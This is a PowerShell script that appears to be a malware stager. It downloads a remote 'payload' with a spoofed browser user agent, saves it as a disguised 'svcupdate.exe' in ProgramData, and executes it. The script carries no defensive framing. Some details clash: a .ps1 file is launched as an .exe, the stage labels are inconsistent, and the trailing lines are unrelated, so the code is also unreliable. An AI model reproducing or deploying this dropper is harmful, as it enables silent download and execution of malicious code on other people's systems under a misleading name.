
[CmdletBinding()]
param(
    [string]$RemoteUrl = "http://127.0.0.1:80/stage1.ps1",
    [string]$WorkingPath = "C:\ProgramData\svcupdate.exe",
    [int]$StageTimeout = 103,
    [string]$BrowserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
)
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$ResultObject = Invoke-PayloadFetch -SourceUrl $RemoteUrl -DestinationPath $WorkingPath -TimeoutSec $StageTimeout -UserAgent $BrowserAgent
if ($ResultObject) {
    Start-Process -FilePath $WorkingPath
}

$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
